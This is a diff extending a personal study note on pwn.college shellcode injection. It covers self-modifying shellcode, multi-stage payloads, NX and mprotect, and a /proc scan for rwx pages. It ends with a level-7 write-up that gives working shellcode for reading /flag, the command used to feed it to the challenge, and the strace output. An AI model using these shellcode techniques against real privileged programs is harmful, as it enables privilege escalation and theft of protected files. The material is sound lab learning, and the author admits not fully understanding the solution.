@@ -181,6 +181,75 @@ sometimes we should explicitly specify the size to avoid ambiguity. So like
 
 **shl: Logical left shift instruction**
 
+if the constraints on shellcode are too hard to get around with clever synonyms, but the page where your shellcode is mapped is writable. remember, **code == data**
+
+for example, forbiddent the `int 3` which is 0xcc in binary, and we can do like this:
+
+```assembly
+inc BYTE PTR [rip] #rip is pointed to next instruction
+.byte 0xcb
+```
+
+when testing this, we need to make sure .text is writable:
+
+> gcc **-Wl, -N  --static** -nostdlib -o shellcode shellcode.s
+
+③ multi-stage shellcode
+
+**stage 1:** read(0, rip, 1000)
+
+- On amd64, we can do ti with **lea rax, [rip]**
+
+**stage 2:** whatever you want
+
+④Useful Tools
+
+[pwntools](https://github.com/Gallopsled/pwntools): a library for writing exploits (and shellcode)
+
+[rappel](https://github.com/yrp604/rappel): lets you explore the effects of instructions
+
+[amd64 opcode listing](http://ref.x86asm.net/coder64.html)
+
+some gdb plugins: [Pwngdb](https://github.com/scwuaptx/Pwngdb), [pwndbg](https://github.com/pwndbg/pwndbg), [peda](https://github.com/longld/peda)...
+
+## Shellcode Injection: Data Execution Prevention
+
+①memory permissions
+
+- **PROT_READ:** allow the process to read memory
+- **PROT_WRITE:** allow the process to write memory
+- **PROT_EXEC:** allow the process to execute memory
+
+Intuition: all code is located in .text segments of the loaded ELF files. There's no need to execute code located on the stack or in the heap. By default in modern systems, the stack and the heap are not executable. (NX: no-execute bit)
+
+②de-protecting memory
+
+Memory can be made executable using the **mprotect() system call**:
+
+- Trick the program into mprotect(PROT_EXEC)ing our shellcode
+  - code reuse through **Return Oriented Programming**
+- Jump to the shellcode
+
+③JIT
+
+![](index.assets/image-20230311174455341.png)
+
+![](index.assets/image-20230311174814275.png)
+
+```shell
+cd /proc #there we have directories for all the processes running on machine
+cat self/maps #self is a link to my current process id
+ls -ld self
+grep -l rwx */maps #see files that match these permissions
+grep -l rwx */maps | parallel "ls -l {//}/exe" #get the xxx/exe and all of the programs have a page mapped in memory that is writable and executable.
+cat xxx/maps 
+grep rwx xxx/maps
+```
+
+shellcode injection technique: JIT spraying
+
+![](index.assets/image-20230311194659606.png)
+
 ## babyshell
 
 **code injection**	=> This challenge reads in some bytes, modifies them , and executes them as code! Shellcode will be copied onto the stack and executed. Since the stack location is randomized on every execution, your shellcode will need to be *position-independent*.
@@ -489,3 +558,104 @@ flag:
 level6: **Removing write permissions from first 4096 bytes of shellcode**
 
 In order to get the flag, just directly add 4096 repeats in the front of the level5 code
+
+level7: **close the stdin, stderr, stdout**
+
+This challenge is about to close 
+
+- **stdin**, which means that it will be harder to pass in a stage-2 shellcode. You will need to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.
+- **stderr**, which means that you will not be able to get use file descriptor 2 for output.
+- **stdout**, which means that you will not be able to get use file descriptor 1 for output. You will see no further output, and will need to figure out an alternate way of communicating data back to yourself.
+
+```shell
+#use the chmod to make the flag file can be read
+#A permission of 004 corresponds to -------r--
+
+- --- --- ---
+-:- or d (file type)
+1---: owner
+2---: group
+3---: other users
+
+for each ---: rwx
+```
+
+this table is about the permission: 
+
+| #    | permission             | rwx  | binary |
+| ---- | ---------------------- | ---- | ------ |
+| 7    | read + write + execute | rwx  | 111    |
+| 6    | read + write           | rw-  | 110    |
+| 5    | read + execute         | r-x  | 101    |
+| 4    | read                   | r--  | 100    |
+| 3    | write + execute        | -wx  | 011    |
+| 2    | write                  | -w-  | 010    |
+| 1    | execute                | --x  | 001    |
+| 0    | none                   | ---  | 000    |
+
+```assembly
+.global _start
+_start:
+.intel_syntax noprefix
+
+	#chmod
+	mov rax, 90
+	lea rdi, [rip+flag]
+	mov rsi, 4 #other users can read the flag
+	#mov rsi, 777
+	syscall
+
+	#open
+	xor rsi, rsi
+	lea rdi, [rip+flag]
+	xor rax, rax
+	mov al, 2
+	syscall
+
+	#read
+	mov rdi, rax
+	mov rsi, rsp
+	xor rdx, rdx
+	mov dl, 100
+	xor rax, rax
+	syscall
+	
+	#write
+	xor rdi, rdi
+	mov dil, 1
+	mov rsi, rsp
+	mov rdx, rax
+	xor rax, rax
+	mov al, 1
+	syscall
+	
+	#exit
+	xor rax, rax
+	mov al, 60
+	xor rdi, rdi
+	mov dil, 42
+	syscall
+
+flag:
+	.ascii "/flag"
+```
+
+```shell
+#============================using in shell
+gcc -nostdlib -static -o 1 1.s && objcopy --dump-section .text=out 1 && cat out | strace /challenge/babyshell_level7
+strace ./1 #get the flag like this:
+
+execve("./1", ["./1"], 0x7fff5cd94da0 /* 25 vars */) = 0
+chmod("/flag", 004)                     = -1 EPERM (Operation not permitted)
+open("/flag", O_RDONLY)                 = 3
+read(3, "pwn.college{a"..., 100) = 56
+write(1, "pwn.college{a"..., 56pwn.college{a}
+) = 56
+exit(42)                                = ?
++++ exited with 42 +++
+
+#============================or just
+./1 #can get the flag
+```
+
+> **Actually I still don't know why the stderr, stdout, stdin which were being closed work and why the `chmod` command can solve this question. I just know it is a way to be able to cat the flag**
